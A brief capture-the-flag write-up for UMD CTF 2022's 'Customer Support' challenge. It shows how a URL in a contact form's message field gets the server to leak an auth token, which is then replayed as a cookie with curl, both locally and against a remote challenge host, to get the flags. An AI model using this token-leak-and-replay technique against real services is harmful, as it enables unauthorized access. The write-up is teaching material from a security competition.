**Customer Support**

**-umd ctf 2022**

- Building the docker:

sudo docker build -t customer .

- Running the docker:

sudo docker run -p 3000:3000 -it customer

- While the docker is running, we should sent the name,email,subject and message in the contact form
- In the contact.ts file, we can see that the url we sent through message is sending a get request
- When we gave message: http:///, in network tab, under response we get the token as hello
- Sending it as cookie using curl will give the flag:
- curl localhost:3000/api/auth --cookie &quot;Authorization=hello&quot;
- This gives the flag as: **UMDCTF{lolo}**

Remotely,

- Send the message and get the response in burp
- This gives token in the response header
- Give this token as url using curl and get the flag
- curl https://customer-support-p558t.ondigitalocean.app/api/auth --cookie &quot;Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlVNRENURiIsImIiOiJUb2RheSBJIHdpbGwgbGl2ZSBpbiB0aGUgbW9tZW50LCB1bmxlc3MgaXQgaXMgdW5wbGVhc2FudCwgaW4gd2hpY2ggY2FzZSwgSSB3aWxsIGVhdCIsImlhdCI6MTcxNjIzOTAyMn0.7SoLIpd9dL9d3Lx84vbAqlLCE5rR3fWqN8ZWLx41QDE&quot;
- Flag: **UMDCTF{I\_b3t\_th@t\_c00kie\_t4sted\_g00d\_d!dnt\_it!U4L\_p4rs1ng\_suck5}**
